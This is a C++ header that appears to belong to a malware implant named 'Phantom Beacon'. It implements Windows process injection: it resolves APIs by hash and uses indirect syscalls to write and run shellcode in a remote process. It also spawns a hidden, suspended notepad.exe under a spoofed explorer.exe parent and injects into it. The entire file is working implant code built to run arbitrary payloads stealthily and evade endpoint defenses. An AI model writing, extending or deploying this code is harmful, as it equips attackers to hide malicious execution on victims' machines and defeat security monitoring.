#pragma once
// ============================================================================
//  injection.h — Phantom Beacon Process Injection (Windows Only)
//  ──────────────────────────────────────────────────────────────
//  Implements Process Hollowing and Remote Thread Injection with PPID Spoofing.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

#include "syscalls.h"

namespace injection {

// Helper to get PID by name
inline DWORD get_process_id_by_name(const std::string& name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (name == pe.szExeFile) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

// Remote Thread Injection via Indirect Syscalls
inline bool inject_shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    auto pOpenProcess = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))peb::Resolve(peb::HASH_KERNEL32, FN_OPENPROCESS);
    if (!pOpenProcess) return false;

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    PVOID pRemoteBuf = nullptr;
    SIZE_T size = shellcode.size();
    
    // NtAllocateVirtualMemory
    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        CloseHandle(hProcess);
        return false;
    }

    // NtWriteVirtualMemory
    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
        // We'd ideally free the memory here with NtFreeVirtualMemory
        CloseHandle(hProcess);
        return false;
    }

    // NtProtectVirtualMemory (RW -> RX)
    DWORD oldProtect;
    if (syscalls::SysNtProtectVirtualMemory(hProcess, &pRemoteBuf, &size, PAGE_EXECUTE_READ, &oldProtect) != 0) {
        CloseHandle(hProcess);
        return false;
    }

    // NtCreateThreadEx
    HANDLE hThread = NULL;
    if (syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL) != 0) {
        CloseHandle(hProcess);
        return false;
    }

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// Simple Process Hollowing (spawns notepad.exe and injects) with PPID Spoofing
inline bool migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    STARTUPINFOEXA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeListSize = 0;

    // 1. Get a handle to a target parent process (e.g., explorer.exe)
    DWORD ppid = get_process_id_by_name("explorer.exe");
    if (ppid == 0) ppid = GetCurrentProcessId(); // Fallback

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
    if (!hParent) return false;

    // 2. Initialize attribute list for PPID spoofing
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attributeListSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeListSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeListSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), nullptr, nullptr);

    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    // 3. Create process with the spoofed parent
    if (!CreateProcessA(nullptr, (LPSTR)"notepad.exe", nullptr, nullptr, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si.StartupInfo, &pi)) {
        CloseHandle(hParent);
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return false;
    }

    bool success = inject_shellcode(pi.dwProcessId, shellcode);
    
    if (success) ResumeThread(pi.hThread);
    else TerminateProcess(pi.hProcess, 0);

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return success;
}

} // namespace injection
#endif
